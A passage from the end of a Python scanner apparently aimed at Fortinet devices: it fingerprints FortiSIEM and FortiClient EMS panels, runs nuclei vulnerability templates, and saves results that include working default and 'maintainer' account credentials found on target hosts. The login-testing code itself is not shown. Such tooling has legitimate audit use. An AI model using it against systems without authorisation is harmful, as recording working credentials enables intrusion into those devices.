                        safe_print(f"    {DIM}{CROSS} Not FortiSIEM  {host_short}{RESET}")
                except Exception as e:
                    if args.verbose:
                        safe_print(f"    {DIM}{CROSS} Error {target}: {e}{RESET}")
        if fortisiem_discoveries:
            print(kv("FortiSIEM Hosts", len(fortisiem_discoveries)))
        print()

    # ── FORTICLIENT MODE ──
    if args.mode == "forticlient":
        section_header("FORTICLIENT EMS FINGERPRINT", SHIELD)
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(detect_forticlient_ems, t, args.timeout): t
                for t in targets
            }
            for future in as_completed(futures):
                target = futures[future]
                try:
                    ind = future.result()
                    if ind["panel"]:
                        ver_str = f" v{ind['version']}" if ind["version"] else ""
                        host_short = re.sub(r"https?://", "", target)
                        safe_print(f"    {GREEN}{CHECK} FortiClient EMS detected{RESET}  {DIM}{ARROW} {host_short}{ver_str}{RESET}")
                        forticlient_discoveries.append({"url": target, "version": ind["version"]})
                    elif args.verbose:
                        host_short = re.sub(r"https?://", "", target)
                        safe_print(f"    {DIM}{CROSS} Not FortiClient EMS  {host_short}{RESET}")
                except Exception as e:
                    if args.verbose:
                        safe_print(f"    {DIM}{CROSS} Error {target}: {e}{RESET}")
        if forticlient_discoveries:
            print(kv("FortiClient EMS Hosts", len(forticlient_discoveries)))
        print()

    # ── VULN MODE ──
    nuclei_findings = []
    if args.mode in ("vuln", "all", "fortisiem", "forticlient"):
        if args.mode == "all":
            print(f"\n  {DIM}{'━' * 58}{RESET}\n")
        if args.mode == "fortisiem" and fortisiem_discoveries:
            print(f"\n  {DIM}{'━' * 58}{RESET}\n")
        if args.mode == "forticlient" and forticlient_discoveries:
            print(f"\n  {DIM}{'━' * 58}{RESET}\n")

        nuclei_findings = run_nuclei(
            targets,
            nuclei_bin,
            tags=NUCLEI_TAGS_RUNTIME,
            severity=NUCLEI_SEVERITY_RUNTIME,
            concurrency=args.nuclei_concurrency,
            timeout=args.timeout,
        )
        print_nuclei_results(nuclei_findings)

    # ── JSON OUTPUT ──
    if args.json:
        output_path = args.output or "forti_results.json"
        combined = {
            "scan_time": datetime.now().isoformat(),
            "mode": args.mode,
            "login_results": all_results if args.mode in ("login", "all") else [],
            "fortisiem_discoveries": fortisiem_discoveries if args.mode == "fortisiem" else [],
            "forticlient_discoveries": forticlient_discoveries if args.mode == "forticlient" else [],
            "nuclei_findings": nuclei_findings if args.mode in ("vuln", "all", "fortisiem", "forticlient") else [],
        }
        with open(output_path, "w") as f:
            json.dump(combined, f, indent=2, default=str)
        print(f"\n  {CYAN}{BULLET} JSON saved to {WHITE}{BOLD}{output_path}{RESET}")
    elif args.output:
        with open(args.output, "w") as f:
            if fortisiem_discoveries:
                f.write("=== FORTISIEM DISCOVERIES ===\n\n")
                for d in fortisiem_discoveries:
                    ver = f" | v{d['version']}" if d.get("version") else ""
                    f.write(f"{d['url']}{ver}\n")
                f.write("\n")
            if forticlient_discoveries:
                f.write("=== FORTICLIENT EMS DISCOVERIES ===\n\n")
                for d in forticlient_discoveries:
                    ver = f" | v{d['version']}" if d.get("version") else ""
                    f.write(f"{d['url']}{ver}\n")
                f.write("\n")
            if all_results:
                f.write("=== DEFAULT LOGIN RESULTS ===\n\n")
                for r in all_results:
                    if r["vulns"]:
                        for v in r["vulns"]:
                            if v["type"] == "maintainer":
                                f.write(f"{r['target']} | maintainer:{v['password']} | serial:{v.get('serial','')}\n")
                            else:
                                pwd = v["password"] if v["password"] else "(blank)"
                                f.write(f"{r['target']} | {v['username']}:{pwd} | {v['method']}\n")
            if nuclei_findings:
                if all_results or fortisiem_discoveries or forticlient_discoveries:
                    f.write("\n")
                f.write("=== NUCLEI VULNERABILITY RESULTS ===\n\n")
                for nf in nuclei_findings:
                    sev = nf["severity"].upper()
                    f.write(f"[{sev}] {nf['name']} | {nf['host']} | {nf['template_id']}\n")
        print(f"\n  {CYAN}{BULLET} Results saved to {WHITE}{BOLD}{args.output}{RESET}")

    print()


if __name__ == "__main__":
    main()
